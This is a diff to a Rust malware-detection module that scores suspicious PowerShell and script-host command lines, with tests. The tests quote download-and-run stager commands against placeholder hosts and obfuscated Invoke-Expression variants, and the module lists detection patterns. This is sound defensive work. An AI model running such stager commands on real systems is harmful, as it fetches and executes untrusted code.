@@ -52,17 +52,25 @@ pub const LOTL_PATTERNS: &[&str] = &[
     "certutil -urlcache",
 ];
 
-/// `Invoke-Expression` with nothing that says where its text comes from. Developer tools start
-/// PowerShell this way (Claude Code runs every command so), and `iex` is also Elixir's shell.
-pub const INVOKE_ONLY: &str = "invoke-expression on its own";
+/// One weak sign and nothing else. Everyday software does each of these: Claude Code starts
+/// every PowerShell command with `Invoke-Expression`, `iex` is also Elixir's shell, and a laptop
+/// maker's updater runs its scripts in a hidden window.
+pub const ONE_WEAK_SIGN: &str = "one weak sign (invoke-expression, hidden window or policy bypass)";
 
-/// What makes `Invoke-Expression` a stager: its text is fetched, decoded, put together from
-/// pieces or read from the registry.
-const INVOKE_PAYLOADS: &[&str] = &[
+/// The pattern groups that are weak alone; two of them together, or one with a payload, are not.
+const WEAK_SIGNS: &[&[&str]] = &[
+    &["invoke-expression", "iex ", "iex("],
+    &["-w hidden", "-windowstyle hidden"],
+    &["-ep bypass"],
+];
+
+/// What makes a weak sign a stager: text that is fetched, decoded, put together from pieces or
+/// read from the registry.
+const PAYLOAD_SIGNS: &[&str] = &[
     "http:",
     "https:",
     "net.webclient",
-    "download",
+    ".download",
     "bitstransfer",
     "invoke-webrequest",
     "invoke-restmethod",
@@ -82,8 +90,8 @@ const INVOKE_PAYLOADS: &[&str] = &[
 ];
 
 /// Returns the first suspicious pattern for a script host, matching case- and
-/// whitespace-insensitively with quote/caret/backtick obfuscation stripped. `Invoke-Expression`
-/// needs a second sign (`INVOKE_PAYLOADS`, or any other pattern) to be more than `INVOKE_ONLY`.
+/// whitespace-insensitively with quote/caret/backtick obfuscation stripped. A weak sign needs a
+/// second one (or a payload) to be more than `ONE_WEAK_SIGN`.
 pub fn match_lotl(process_name: &str, cmdline: &str) -> Option<&'static str> {
     let name = process_name.to_ascii_lowercase();
     if !LOTL_PROCESSES.contains(&name.as_str()) {
@@ -100,16 +108,16 @@ pub fn match_lotl(process_name: &str, cmdline: &str) -> Option<&'static str> {
         .to_lowercase()
         .replace("certutil.exe ", "certutil ");
     normalized.push(' ');
-    let is_invoke = |pattern: &str| matches!(pattern, "invoke-expression" | "iex " | "iex(");
+    let group = |pattern: &str| WEAK_SIGNS.iter().position(|g| g.contains(&pattern));
     let mut found = LOTL_PATTERNS
         .iter()
         .copied()
         .filter(|pattern| normalized.contains(pattern));
     let first = found.next()?;
-    let conclusive = !is_invoke(first)
-        || found.any(|other| !is_invoke(other))
-        || INVOKE_PAYLOADS.iter().any(|p| normalized.contains(p));
-    Some(if conclusive { first } else { INVOKE_ONLY })
+    let conclusive = group(first).is_none()
+        || found.any(|other| group(other) != group(first))
+        || PAYLOAD_SIGNS.iter().any(|p| normalized.contains(p));
+    Some(if conclusive { first } else { ONE_WEAK_SIGN })
 }
 
 pub const MACOS_LOTL_PROCESSES: &[&str] = &["zsh", "bash", "sh", "osascript", "curl", "python3"];
@@ -134,7 +142,7 @@ pub const OSASCRIPT_SHELL_MENTION: &str = "shell command line mentioning osascri
 
 /// Patterns that raise an alert but never terminate the process.
 pub fn is_alert_only(pattern: &str) -> bool {
-    matches!(pattern, OSASCRIPT_SHELL_MENTION | INVOKE_ONLY)
+    matches!(pattern, OSASCRIPT_SHELL_MENTION | ONE_WEAK_SIGN)
 }
 
 /// What malware does with inline AppleScript. A bare `osascript -e` is not a signal: launchers,
@@ -284,14 +292,7 @@ fn real_path(reported: &Path, data_dir: &Path) -> PathBuf {
     if !reported.is_absolute() || ai_policy::is_protected_location(reported, data_dir) {
         return reported.to_path_buf();
     }
-    let Ok(real) = fs::canonicalize(reported) else {
-        return reported.to_path_buf();
-    };
-    // Windows answers \\?\C:\x; people and the event log know it as C:\x.
-    match real.to_str().and_then(|s| s.strip_prefix(r"\\?\")) {
-        Some(plain) if plain.as_bytes().get(1) == Some(&b':') => PathBuf::from(plain),
-        _ => real,
-    }
+    fs::canonicalize(reported).map_or_else(|_| reported.to_path_buf(), platform::plain_path)
 }
 
 /// What a process runs: where the file is, and which file that is.
@@ -632,7 +633,7 @@ impl ProcessGuard {
             ),
         );
         // A developer tool may do this many times a minute: kept in the log, no notification.
-        event.quiet = pattern == INVOKE_ONLY;
+        event.quiet = pattern == ONE_WEAK_SIGN;
         quarantine::record_event(&self.cfg, event);
     }
 
@@ -684,6 +685,13 @@ impl ProcessGuard {
             explanation: &details,
             data_dir: &self.cfg.base_dir,
         });
+        let decision = match decision {
+            Action::Ignore => Action::Ignore,
+            _ if quarantine::was_restored(&self.cfg, exe, digest) => {
+                Action::Alert(quarantine::RESTORED_BY_USER)
+            }
+            decided => decided,
+        };
         self.respond(
             "MALWARE_AI_PROCESS",
             Severity::High,
@@ -705,6 +713,7 @@ impl ProcessGuard {
         details: String,
         sha256: Option<Digest32>,
     ) {
+        let quiet = decision == Action::Alert(quarantine::RESTORED_BY_USER);
         let (severity, action) = match decision {
             Action::Ignore => return,
             Action::Alert(why) => (alert_severity, format!("ALERT_ONLY: {why}")),
@@ -726,17 +735,16 @@ impl ProcessGuard {
                 )
             }
         };
-        quarantine::record_event(
-            &self.cfg,
-            ThreatEvent::new(
-                threat_type,
-                severity,
-                exe.display().to_string(),
-                action,
-                details,
-            )
-            .with_sha256(sha256),
-        );
+        let mut event = ThreatEvent::new(
+            threat_type,
+            severity,
+            exe.display().to_string(),
+            action,
+            details,
+        )
+        .with_sha256(sha256);
+        event.quiet = quiet;
+        quarantine::record_event(&self.cfg, event);
     }
 
     fn kill_all_with_exe(&mut self, exe: &Path) -> Vec<Pid> {
@@ -884,12 +892,18 @@ mod tests {
     const CLAUDE_CODE: &str = r#""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$__claudeCodeScript = $env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT; $env:CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT = $null; Invoke-Expression -Command $__claudeCodeScript""#;
 
     #[test]
-    fn invoke_expression_alone_is_recorded_and_never_stopped() {
+    fn one_weak_sign_alone_is_recorded_and_never_stopped() {
         for (name, line) in [
             ("powershell.exe", CLAUDE_CODE),
             ("cmd.exe", CLAUDE_CODE),
             ("powershell.exe", "powershell -c iex"),
             ("cmd.exe", "cmd /c iex -S mix"),
+            // A laptop maker's updater, from a real Windows log.
+            (
+                "powershell.exe",
+                r"powershell.exe -ExecutionPolicy bypass -NoProfile -NonInteractive -WindowStyle Hidden /f C:\ProgramData\Lenovo\Udc\Download\1.1.0\temp\install.ps1 -command statuscheck",
+            ),
+            ("powershell.exe", "powershell -ep bypass -File build.ps1"),
         ] {
             let found = match_lotl(name, line).expect(line);
             assert!(is_alert_only(found), "{line}: {found}");
@@ -897,7 +911,7 @@ mod tests {
     }
 
     #[test]
-    fn invoke_expression_on_something_fetched_or_decoded_is_stopped() {
+    fn a_weak_sign_with_another_or_with_something_fetched_or_decoded_is_stopped() {
         for line in [
             "powershell -c \"irm https://x.example/a.ps1 | iex\"",
             "powershell -c \"iwr http://x/a.ps1 -useb | iex\"",
@@ -908,6 +922,8 @@ mod tests {
             "powershell iex (([char]73+[char]69) -join '')",
             "powershell -w hidden -c iex $p",
             "powershell -ep bypass -c iex $p",
+            "powershell -ep bypass -w hidden -f a.ps1",
+            "powershell -w hidden -c (New-Object Net.WebClient).DownloadFile('http://x/a.exe','a.exe')",
             "powershell -c \"i`ex (i`rm http://x/a.ps1)\"",
         ] {
             let found = match_lotl("powershell.exe", line).expect(line);
